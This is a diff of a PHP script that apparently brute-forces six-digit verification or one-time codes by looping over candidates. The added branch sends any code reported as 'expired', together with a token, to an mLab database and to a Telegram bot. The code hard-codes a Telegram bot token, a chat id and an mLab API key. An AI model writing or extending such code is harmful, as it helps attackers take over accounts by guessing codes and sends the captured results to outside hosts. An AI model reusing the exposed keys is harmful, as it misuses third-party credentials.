@@ -60,6 +60,18 @@ curl_exec($ch);
 curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
 curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeEiDkwUbuxZgpUedAOHMTD_k/sendMessage?chat_id=536224432&text=".($pass+$i));
 curl_exec($ch);
+
+}else if(strpos($cnt,"expired")!==false){
+$found=sprintf("%06d",($pass+$i));
+curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
+$pst='{"_id":"'.$token.'","found":"expired '.sprintf("%06d",($pass+$i)).'"}';
+curl_setopt($ch,CURLOPT_POSTFIELDS,$pst);
+curl_setopt($ch,CURLOPT_URL,"https://api.mlab.com/api/1/databases/openhouse/collections/account?apiKey=bXOzYMlc15gzN7i2DXEWroMVk0vk7pfY");
+curl_exec($ch);
+
+curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
+curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeEiDkwUbuxZgpUedAOHMTD_k/sendMessage?chat_id=536224432&text=$cnt");
+curl_exec($ch);
 }
 
 }//for
@@ -121,7 +133,7 @@ curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeE
 
 }else{
 //without id
-echo "token : ".$token."<br>found : ".$found;
+echo "Token : ".$token."<br>found : ".$found;
 }
 
 curl_close($ch);
